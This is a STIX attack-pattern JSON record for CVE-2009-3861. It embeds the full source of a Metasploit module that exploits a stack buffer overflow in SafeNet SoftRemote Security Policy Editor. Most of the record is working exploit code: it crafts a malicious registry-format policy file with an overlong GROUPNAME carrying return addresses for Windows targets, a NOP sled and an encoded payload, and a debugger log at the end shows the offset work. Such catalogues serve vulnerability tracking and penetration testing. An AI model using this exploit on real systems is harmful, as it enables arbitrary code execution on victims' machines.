{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dadb9654-0dcc-44be-8838-19d32f388e7b",
    "created": "2024-08-14T16:36:53.611859Z",
    "modified": "2024-08-14T16:36:53.611863Z",
    "name": "SafeNet SoftRemote GROUPNAME Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in SafeNet SoftRemote Security Policy Editor <= 10.8.5. When an attacker creates a specially formatted security policy with an overly long GROUPNAME argument, it is possible to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/safenet_softremote_groupname.rb",
            "external_id": "safenet_softremote_groupname.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3861"
        },
        {
            "source_name": "reference",
            "url": "http://www.senseofsecurity.com.au/advisories/SOS-09-008"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SafeNet SoftRemote GROUPNAME Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in SafeNet SoftRemote\n        Security Policy Editor <= 10.8.5. When an attacker\n        creates a specially formatted security policy with an\n        overly long GROUPNAME argument, it is possible to execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3861' ],\n          [ 'OSVDB', '59660'],\n          [ 'URL', 'http://www.senseofsecurity.com.au/advisories/SOS-09-008' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true,\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'   =>  'True',\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 English',  { 'Ret' => 0x7e47bcaf } ],\n          [ 'WinSrv 2000 SP4 English', { 'Ret' => 0x78344dd3 } ],\n          [ 'WinSrv 2000 SP2 English', { 'Ret' => 0x7843c1a1 } ],\n          [ 'WinSrv 2003 Enterprise Edition SP1 (v1023) English', { 'Ret' => 0x7741246b } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-10-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.',  'msf.spd']),\n      ])\n  end\n\n  def exploit\n    # Need to cause the access violation!!\n    sploit = rand_text_alpha_upper(20024)\n\n    sploit[92,4] = [target.ret].pack('V')\n    # Play it safe.\n    sploit[96,100] = \"\\x90\" * 100\n    sploit[196,payload.encoded.length] = payload.encoded\n\n    spd =  \"REGEDIT4\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL]\\n\"\n    spd << \"\\\"CrlPollInterval\\\"=dword:00000001\\n\"\n    spd << \"\\\"CertPollingInterval\\\"=dword:0000000f\\n\"\n    spd << \"\\\"PolicyInterval\\\"=dword:000005a0\\n\"\n    spd << \"\\\"NETPROC\\\"=dword:00000003\\n\"\n    spd << \"\\\"LACTNETPROC\\\"=dword:00000003\\n\"\n    spd << \"\\\"BUILDVER\\\"=\\\"10.8.1 (Build 10)\\\"\\n\"\n    spd << \"\\\"NONNIPPROC\\\"=dword:00000001\\n\"\n    spd << \"\\\"STATICIP\\\"=dword:00000000\\n\"\n    spd << \"\\\"ENABLEGATEWAY\\\"=dword:00000000\\n\"\n    spd << \"\\\"ENABLELOGGING\\\"=dword:00000000\\n\"\n    spd << \"\\\"RETRANSTIMER\\\"=dword:0000000f\\n\"\n    spd << \"\\\"RETRYCOUNTER\\\"=dword:00000003\\n\"\n    spd << \"\\\"NOTIFICPAYLOADS\\\"=dword:00000001\\n\"\n    spd << \"\\\"PolicyServerPort\\\"=dword:00000185\\n\"\n    spd << \"\\\"UsePolicyServer\\\"=dword:00000000\\n\"\n    spd << \"\\\"PolicyServerName\\\"=\"\"\\n\"\n    spd << \"\\\"NewPolicyResetsConns\\\"=dword:00000000\\n\"\n    spd << \"\\\"UseCerts\\\"=dword:00000000\\n\"\n    spd << \"\\\"PublishMyCert\\\"=dword:00000001\\n\"\n    spd << \"\\\"PolicySubtree\\\"=\\\"ou=SoftRemote, o=SafeNet\\\"\\n\"\n    spd << \"\\\"PDPMode\\\"=dword:00000000\\n\"\n    spd << \"\\\"PDPUrl\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"UseProxyServer\\\"=dword:00000000\\n\"\n    spd << \"\\\"ProxyServer\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"LdapServer\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"DefaultCrlUrl\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"EnableCrlPolling\\\"=dword:00000000\\n\"\n    spd << \"\\\"SCARD_CLEARS_KEYS\\\"=dword:00000000\\n\"\n    spd << \"\\\"VPNRequiresFirewall\\\"=dword:00000000\\n\"\n    spd << \"\\\"BypassRequiresFirewall\\\"=dword:00000000\\n\"\n    spd << \"\\\"MapVPNToFirewall\\\"=dword:00000000\\n\"\n    spd << \"\\\"MapPolicyToFirewall\\\"=dword:00000000\\n\"\n    spd << \"\\\"MapBypassToFirewall\\\"=dword:00000000\\n\"\n    spd << \"\\\"EnableFirewallLogging\\\"=dword:00000000\\n\"\n    spd << \"\\\"TCPENCAPPORT\\\"=dword:00000000\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\0]\\n\"\n    spd << \"\\\"ACTION\\\"=dword:00000001\\n\"\n    spd << \"\\\"TREENAME\\\"=\\\"Other Connections\\\"\\n\"\n    spd << \"\\\"GROUPID\\\"=\\\"_SafeNet_Default_Group\\\"\\n\"\n    spd << \"\\\"LOCKMODE\\\"=dword:00000000\\n\"\n    spd << \"\\\"USEMANKEYS\\\"=dword:00000000\\n\"\n    spd << \"\\\"USEPPKS\\\"=dword:00000000\\n\"\n    spd << \"\\\"USEPFS\\\"=dword:00000000\\n\"\n    spd << \"\\\"REPLAYDETECT\\\"=dword:00000001\\n\"\n    spd << \"\\\"MANUALONLY\\\"=dword:00000000\\n\"\n    spd << \"\\\"AGGRMODE\\\"=dword:00000000\\n\"\n    spd << \"\\\"P2GROUPDESC\\\"=dword:00000002\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\0\\\\MYID]\\n\"\n    spd << \"\\\"CERTIFICATELABEL\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"CERTIFICATEISSUER\\\"=hex:\\n\"\n    spd << \"\\\"PORT\\\"=dword:ffffffff\\n\"\n    spd << \"\\\"PORTNAME\\\"=\\\"All\\\"\\n\"\n    spd << \"\\\"NET_INTFC\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"InternalIP\\\"=dword:00000000\\n\"\n    spd << \"\\\"AUTOCERT\\\"=dword:00000001\\n\"\n    spd << \"\\\"TYPE\\\"=dword:00000009\\n\"\n    spd << \"\\\"FQDN\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"UFQDN\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"DN\\\"=hex:\\n\"\n    spd << \"\\\"PRESHR\\\"=hex:\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\0\\\\MYID\\\\VASUPPORT]\\n\"\n    spd << \"\\\"VASUPPORT\\\"=dword:00000000\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\0\\\\PH1PROPOSAL_0]\\n\"\n    spd << \"\\\"AUTHMETHOD\\\"=dword:00000003\\n\"\n    spd << \"\\\"PH1ENCRALG\\\"=dword:00000005\\n\"\n    spd << \"\\\"PH1KEYLEN\\\"=dword:00000000\\n\"\n    spd << \"\\\"PH1HASHALG\\\"=dword:00000002\\n\"\n    spd << \"\\\"GROUPDESC\\\"=dword:00000002\\n\"\n    spd << \"\\\"IKESALIFETYPE\\\"=dword:00000000\\n\"\n    spd << \"\\\"IKESADUR_KB\\\"=dword:00000000\\n\"\n    spd << \"\\\"IKESADUR_SEC\\\"=dword:00000000\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\0\\\\PH2PROPOSAL_0]\\n\"\n    spd << \"\\\"AH\\\"=dword:00000000\\n\"\n    spd << \"\\\"AHTRANSFORM\\\"=dword:00000003\\n\"\n    spd << \"\\\"AHENCAPMODE\\\"=dword:00000001\\n\"\n    spd << \"\\\"ESP\\\"=dword:00000001\\n\"\n    spd << \"\\\"KEYLENGTH\\\"=dword:00000000\\n\"\n    spd << \"\\\"ESPTRANSFORM\\\"=dword:00000003\\n\"\n    spd << \"\\\"ESPKEYLEN\\\"=dword:00000000\\n\"\n    spd << \"\\\"ESPHASHALG\\\"=dword:00000002\\n\"\n    spd << \"\\\"ESPENCAPMODE\\\"=dword:00000001\\n\"\n    spd << \"\\\"KEYLIFETYPE\\\"=dword:00000000\\n\"\n    spd << \"\\\"KEYDUR_KB\\\"=dword:00000000\\n\"\n    spd << \"\\\"KEYDUR_SEC\\\"=dword:00000000\\n\"\n    spd << \"\\\"IPCOMP\\\"=dword:00000000\\n\"\n    spd << \"\\\"IPCOMPTRANSFORM\\\"=dword:00000000\\n\"\n    spd << \"\\\"INMANSPI\\\"=dword:00000100\\n\"\n    spd << \"\\\"INMANAHKEY\\\"=hex:\\n\"\n    spd << \"\\\"INMANESPENCRKEY\\\"=hex:\\n\"\n    spd << \"\\\"INMANESPHMACKEY\\\"=hex:\\n\"\n    spd << \"\\\"OUTMANSPI\\\"=dword:00000100\\n\"\n    spd << \"\\\"OUTMANAHKEY\\\"=hex:\\n\"\n    spd << \"\\\"OUTMANESPENCRKEY\\\"=hex:\\n\"\n    spd << \"\\\"OUTMANESPHMACKEY\\\"=hex:\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\0\\\\PROXYADDRESS]\\n\"\n    spd << \"\\\"TYPE\\\"=dword:00000001\\n\"\n    spd << \"\\\"ADDR1\\\"=dword:00000000\\n\"\n    spd << \"\\\"ADDR2\\\"=dword:00000000\\n\"\n    spd << \"\\\"IPADDR\\\"=dword:00000000\\n\"\n    spd << \"\\\"USELDAP\\\"=dword:00000000\\n\"\n    spd << \"\\\"LOCATIONTYPE\\\"=dword:00000001\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\0\\\\REMOTEADDRESS]\\n\"\n    spd << \"\\\"TYPE\\\"=dword:00000001\\n\"\n    spd << \"\\\"ADDR1\\\"=dword:00000000\\n\"\n    spd << \"\\\"ADDR2\\\"=dword:00000000\\n\"\n    spd << \"\\\"IPADDR\\\"=dword:00000000\\n\"\n    spd << \"\\\"PROTOCOL\\\"=dword:ffffffff\\n\"\n    spd << \"\\\"PORT\\\"=dword:ffffffff\\n\"\n    spd << \"\\\"PORTNAME\\\"=\\\"All\\\"\\n\"\n    spd << \"\\\"USELDAP\\\"=dword:00000000\\n\"\n    spd << \"\\\"USESGW\\\"=dword:00000000\\n\"\n    spd << \"\\\"SGWOPTIONS\\\"=dword:00000000\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\CertReqDef]\\n\"\n    spd << \"\\\"NameChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"DeptChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"CompanyChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"StateChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"CountryChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"EmailChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"HostChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"IPChoice\\\"=dword:00000000\\n\"\n    spd << \"\\\"GetDefName\\\"=dword:00000001\\n\"\n    spd << \"\\\"GetDefDept\\\"=dword:00000000\\n\"\n    spd << \"\\\"GetDefCompany\\\"=dword:00000001\\n\"\n    spd << \"\\\"GetDefState\\\"=dword:00000000\\n\"\n    spd << \"\\\"GetDefCountry \\\"=dword:00000001\\n\"\n    spd << \"\\\"GetDefEmail\\\"=dword:00000001\\n\"\n    spd << \"\\\"GetDefHost\\\"=dword:00000001\\n\"\n    spd << \"\\\"GetDefIP\\\"=dword:00000001\\n\"\n    spd << \"\\\"DeptValue\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"CompanyValue\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"StateValue\\\"=\\\"\\\"\\n\"\n    spd << \"\\\"CountryValue\\\"=\\\"\\\"\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\GROUPDEFS]\\r\\n\\r\\n\"\n    spd << \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IRE\\\\SafeNet/Soft-PK\\\\ACL\\\\GROUPDEFS\\\\_SafeNet_Default_Group]\\n\"\n    spd << \"\\\"GROUPLOCK\\\"=dword:00000000\\n\"\n    spd << \"\\\"GROUPNAME\\\"=\\\"#{sploit}\\\"\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(spd)\n\n  end\nend\n\n=begin\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0012c454 ebx=7e42f3c2 ecx=00bbe744 edx=00130000 esi=0012cfe0 edi=00bb54f0\neip=7c80beb9 esp=0012c430 ebp=0012c454 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\kernel32.dll -\nkernel32!lstrcpy+0x18:\n7c80beb9 8802            mov     byte ptr [edx],al          ds:0023:00130000=41\n0:000> !exchain\n0012c444: kernel32!ValidateLocale+2b0 (7c839ad8)\n0012c4f8: 41386341\nInvalid exception stack at 37634136\n0:000> !load byakugan\n[Byakugan] Successfully loaded!\n0:000> !pattern_offset 20024 0x41386341\n[Byakugan] Control of 0x41386341 at offset 84.\n0:000> !pattern_offset 20024 0x37634136\n[Byakugan] Control of 0x37634136 at offset 80.\n0:000> !pattern_offset 20024\n[Byakugan] Control of ecx at offset 80.\n[Byakugan] Control of eip at offset 92.\n=end\n",
    "x_mitre_disclosure_date": "2009-10-30",
    "x_mitre_platforms": [
        "win'"
    ]
}